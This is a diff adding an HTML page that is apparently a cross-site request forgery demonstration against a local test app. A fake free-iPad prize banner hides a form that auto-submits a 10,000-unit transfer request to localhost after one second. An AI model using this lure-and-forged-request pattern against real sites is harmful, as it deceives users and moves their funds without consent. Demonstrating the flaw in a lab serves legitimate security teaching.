@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You Won a Free Prize!</title>
+</head>
+<body style="background-color: #ffe5e5; text-align: center; padding-top: 50px; font-family: sans-serif;">
+    
+    <h1>🎉 Congratulations! You won a free iPad! 🎉</h1>
+    <p>Loading your prize...</p>
+
+    <form id="csrf-form" action="http://localhost:8080/transfer" method="POST" style="display: none;">
+        <input type="hidden" name="amount" value="10000"/>
+    </form>
+
+    <script>
+        // The moment the user lands on this page, the javascript automatically clicks "submit" on the hidden form.
+        setTimeout(() => {
+            document.getElementById("csrf-form").submit();
+        }, 1000); // 1 second delay just for dramatic effect
+    </script>
+</body>
+</html>
